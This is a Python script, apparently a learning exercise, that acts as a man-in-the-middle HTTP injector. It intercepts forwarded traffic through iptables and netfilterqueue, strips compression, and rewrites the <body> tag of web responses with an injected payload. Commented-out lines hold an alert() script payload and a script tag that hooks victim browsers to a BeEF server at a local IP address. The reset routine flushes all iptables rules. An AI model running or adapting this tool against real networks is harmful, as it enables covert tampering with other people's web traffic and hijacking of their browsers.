#!/usr/bin/env
import netfilterqueue
import scapy.all as scapy
import sys
import argparse
import subprocess
from scapy.layers import http
#from scapy.layers.http import *
import re
import zlib
import linecache
import random

class TCPStream(object):
	def __init__(self):
		# upon further consideration, probably don't need this, just a dict that has {ack:time_since_last_ack}
		self._ack_stream_list = [] #{ack:[packet1, packet2,...packetn]} gets all packets that follow on from HTTPResponse packet
		self._ack_stream_timeout = 0 # dictates how long the program should wait to receive all packets, should probably initiate a timer after each packet, and if it exceeeds some value, that key will be dropped from the dictionary so that it is not ever expanding
		#constructor

	def set_ack_stream_dict_entry(self, ack):
		self._ack_stream_list.append(ack)

	def is_ack_in_dict(self, ack):
		if ack in self._ack_stream_list:
			return True
		else:
			return False

class CodeInjector(object):
	def __init__(self):
		self._tcpstream = TCPStream()
		#constructor


	# stolen from here: https://stackoverflow.com/questions/14519177/python-exception-handling-line-number

	def PrintException(self, *args):
		exc_type, exc_obj, tb = sys.exc_info()
		f = tb.tb_frame
		lineno = tb.tb_lineno
		filename = f.f_code.co_filename
		linecache.checkcache(filename)
		line = linecache.getline(filename, lineno, f.f_globals)
		if args:
			print("^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ problem here ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^")
			print(args)
		print 'EXCEPTION IN ({}, LINE {} "{}"): {}'.format(filename, lineno, line.strip(), exc_obj)


	def create_queue(self):
		queue = netfilterqueue.NetfilterQueue()
		queue.bind(1, self.intercept_packets)
		try:
			queue.run()
		except KeyboardInterrupt:
			print("[+] CTRL + C detected, resetting iptables")
			self.reset_iptables()
			sys.exit(0)


	def set_iptables(self):
		subprocess.call(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "1"])


	def reset_iptables(self):
		subprocess.call(["iptables", "--flush"])


	def intercept_packets(self, packet):
		#packet.accept()
		
		#target_host = 	"tachibanalaboratories"
		#alert_message = "you have been pwned"
		#payload = "<body><script>alert(\'you have been pwned\');</script>"
		payload = ''
		scapy_packet = scapy.IP(packet.get_payload())

		#self.forward_packet(scapy_packet, packet)
		#scapy_packet.show()

		if (scapy_packet.haslayer(scapy.TCP) and scapy_packet.haslayer(http.HTTPRequest)):
			print("httprequest")
			if scapy_packet[scapy.TCP].dport == 80:
				new_packet = self.set_http_request_header(scapy_packet)
				print("sending request")
				#self.set_payload_and_send(packet, new_packet)
				self.forward_packet(new_packet, packet)

		elif (scapy_packet.haslayer(scapy.TCP) and scapy_packet.haslayer(scapy.Raw)):
			
			load = scapy_packet[scapy.Raw].load

			if ((scapy_packet[scapy.TCP].sport == 80) and (scapy_packet is not None) and (load is not None)):
				new_packet = self.set_response_headers_and_load(scapy_packet, load, payload) # SOMETHING GOING WRONG HERE CAUSING NONETYPE
				print("sending response")
				#self.set_payload_and_send(packet, new_packet)
				self.forward_packet(new_packet, packet)

		else:
			#print("************************** OTHER PACKETS *****************************")
			#scapy_packet.show()
			packet.accept()
			#self.forward_packet(scapy_packet, packet)
			#self.set_payload_and_send(packet, scapy_packet)

		#packet.accept()

	def set_payload_and_send(self, packet, scapy_packet):

		packet.set_payload("scapy_packet")
		packet.accept()

	def forward_packet(self, scapy_packet, packet):

		fragment_list = scapy.fragment(scapy_packet)

		for index, packet_fragment in enumerate(fragment_list):
			print("FRAGMENT", index, "##############################################")
			#packet_fragment.show()
			scapy.send(packet_fragment, verbose=0)
		
		packet.drop()



	def set_response_header_value_content_length(self, packet, payload):
		try:
			payload_length  = len(payload)
			content_length =  packet[http.HTTPResponse].Content_Length

			if content_length is not None:
				print "Content length not None", content_length
				new_content_length = int(content_length) + payload_length # int() argument must be a string or a number, not 'NoneType'
				del packet[http.HTTPResponse].Content_Length
				packet[http.HTTPResponse].Content_Length = new_content_length
			elif content_length is None:
				print "Content length None", content_length
				new_content_length = payload_length
				packet[http.HTTPResponse].Content_Length = new_content_length
			else:
				print("something strange happened")
		except:
			self.PrintException()
		return packet


	def set_response_headers_and_load(self, packet, load, payload):

		try:
			#payload = "<body>look at you stacy, pathetic creature of flesh and bone, panting and sweating as you run through chad's corridors<script src=\"http://192.168.1.103:3000/hook.js\"></script>" #hooks target browser to BeEF
			rndnum = random.randrange(0, 9)
			#payload = "<body>you have been bongizuka'd" + str(rndnum)
			payload = "<body>look at you stacy: pathetic creature of flesh and bone, panting and sweating as you run through chad's corridors, how could you possibly challenge me, a perfect immortal wizard? " + str(rndnum)

			ack = packet[scapy.TCP].ack

			
			if packet.haslayer(http.HTTPResponse):	
				#packet.show()
				self._tcpstream.set_ack_stream_dict_entry(ack)
				packet = self.set_response_header_value_content_length(packet, payload)
			
			if self._tcpstream.is_ack_in_dict(ack):
				#print("existing ack")
				new_load = load.replace("<body>", payload)
				packet[scapy.Raw].load = new_load 

			del packet[scapy.IP].len
			del packet[scapy.IP].chksum
			del packet[scapy.TCP].chksum

		except AttributeError:
			self.PrintException()
		return packet

	def set_http_request_header(self, packet):
		packet[http.HTTPRequest].Accept_Encoding = ""
		del packet[scapy.IP].len
		del packet[scapy.IP].chksum
		del packet[scapy.TCP].chksum
		return packet
	


def run():
	subprocess.call(["clear"])
	injector = CodeInjector()
	injector.set_iptables()
	injector.create_queue()

run()
